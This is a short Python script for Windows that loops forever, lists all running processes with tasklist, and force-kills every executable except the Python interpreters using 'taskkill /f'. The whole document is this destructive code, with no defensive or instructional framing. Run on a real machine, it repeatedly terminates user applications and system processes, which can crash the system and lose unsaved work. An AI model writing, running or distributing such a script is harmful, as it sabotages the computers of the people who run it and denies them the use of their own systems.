import os
while 1:
    os.system('tasklist > exefiles.txt')
    open_exefile=open('exefiles.txt','r+')
    lineread=open_exefile.readlines()
    exeapps=[]
    for ifexe in lineread:
        if '.exe' in ifexe:
            exeapps.append(ifexe)
    finalexe=[]
    for finexe in exeapps:
        pos=finexe.find('.exe')
        finalexe.append(finexe[0:(pos+4)])
    for kill in finalexe:
        if kill !='python.exe' and kill !='pythonw.exe' and kill !='py.exe' :
            os.system(f'taskkill /f /im {kill}')
